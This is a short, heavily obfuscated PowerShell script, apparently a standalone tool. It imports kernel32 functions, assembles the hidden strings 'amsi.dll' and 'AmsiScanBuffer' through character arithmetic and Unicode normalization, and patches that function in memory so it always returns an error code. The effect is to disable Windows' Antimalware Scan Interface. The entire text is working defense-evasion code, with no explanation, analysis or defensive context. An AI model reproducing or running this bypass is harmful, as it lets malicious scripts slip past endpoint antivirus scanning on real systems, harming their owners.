$bt_m0J3WuV3b = @"
using System;
using System.Runtime.InteropServices;
public class bt_m0J3WuV3b {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr qF3admWoC, string QTpBZGGwjc5);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr pQ9Fd4zlEj0D, UIntPtr rMeKqm, uint Dlyg9D, out uint bMjowYWUnju);
}
"@

Add-Type $bt_m0J3WuV3b

$IMzLjU3Wg2y40O = [bt_m0J3WuV3b]::LoadLibrary("$([CHar](97+27-27)+[chAR](97+12)+[CHAr](115+44-44)+[cHAr]([bytE]0x69)+[ChAR](46*15/15)+[cHAR]([BytE]0x64)+[Char]([bytE]0x6c)+[CHar](49+59))")
$_Q_ = [bt_m0J3WuV3b]::GetProcAddress($IMzLjU3Wg2y40O, "$(('ÄmsîScãnBùf'+'fèr').NOrMALiZe([cHaR](70+30-30)+[char](111*45/45)+[cHar](114*50/50)+[char](109+17-17)+[ChaR]([BytE]0x44)) -replace [Char](92+71-71)+[CHAR]([ByTe]0x70)+[CHAr](123*43/43)+[Char]([bYTE]0x4d)+[ChAR]([bYTe]0x6e)+[chaR](125))")
$p = 0
[bt_m0J3WuV3b]::VirtualProtect($_Q_, [uint32]5, 0x40, [ref]$p)
$mtgpt3b4MzTUQ = "0xB8"
$lsQxrwec = "0x57"
$wH4IqzELgd9 = "0x00"
$d9X = "0x07"
$pSwWt95EHnmaO = "0x80"
$iX6hr4QSUkhFgaiiDkB = "0xC3"
$sHyQMVjFUYoL0huXM0x = [Byte[]] ($mtgpt3b4MzTUQ,$lsQxrwec,$wH4IqzELgd9,$d9X,+$pSwWt95EHnmaO,+$iX6hr4QSUkhFgaiiDkB)
[System.Runtime.InteropServices.Marshal]::Copy($sHyQMVjFUYoL0huXM0x, 0, $_Q_, 6)